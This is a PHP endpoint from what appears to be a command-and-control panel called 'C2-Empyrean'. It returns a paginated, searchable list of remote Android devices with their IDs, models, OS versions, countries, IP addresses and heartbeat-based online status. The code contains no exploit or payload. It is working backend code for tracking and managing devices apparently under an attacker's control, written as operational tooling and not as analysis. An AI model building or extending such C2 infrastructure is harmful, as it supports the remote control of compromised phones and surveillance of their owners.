<?php
/**
 * C2-Empyrean - API: List Devices
 * GET /api/devices/list
 * Query: ?page=1&per_page=50&status=online&search=keyword
 */

$middleware->requireAuth();

$page = max(1, (int)($_GET['page'] ?? 1));
$perPage = min(100, max(1, (int)($_GET['per_page'] ?? 50)));
$status = $_GET['status'] ?? null;
$search = $_GET['search'] ?? null;

$devices = $db->read('devices');

// Filter by status
if ($status === 'online') {
    $devices = array_filter($devices, fn($d) => ($d['is_online'] ?? false) === true);
} elseif ($status === 'offline') {
    $devices = array_filter($devices, fn($d) => ($d['is_online'] ?? false) !== true);
}

// Search by keyword
if ($search) {
    $search = strtolower($search);
    $devices = array_filter($devices, function($d) use ($search) {
        $fields = [$d['device_id'] ?? '', $d['model'] ?? '', $d['android_version'] ?? '', $d['country'] ?? '', $d['ip'] ?? ''];
        foreach ($fields as $f) {
            if (strpos(strtolower($f), $search) !== false) return true;
        }
        return false;
    });
}

// Sort by last seen (newest first)
usort($devices, fn($a, $b) => ($b['last_seen'] ?? 0) <=> ($a['last_seen'] ?? 0));

// Calculate online status
$now = time();
$timeout = HEARTBEAT_INTERVAL * 3;
foreach ($devices as &$device) {
    $device['is_online'] = (($device['last_seen'] ?? 0) + $timeout) > $now;
}
unset($device);

// Paginate
$total = count($devices);
$totalPages = ceil($total / $perPage);
$offset = ($page - 1) * $perPage;
$items = array_slice(array_values($devices), $offset, $perPage);

// Summary stats
$onlineCount = count(array_filter($devices, fn($d) => $d['is_online'] ?? false));
$offlineCount = $total - $onlineCount;

echo json_encode([
    'success' => true,
    'data' => [
        'devices' => $items,
        'pagination' => [
            'page' => $page,
            'per_page' => $perPage,
            'total' => $total,
            'pages' => $totalPages,
        ],
        'summary' => [
            'total' => $total,
            'online' => $onlineCount,
            'offline' => $offlineCount,
        ],
    ],
]);
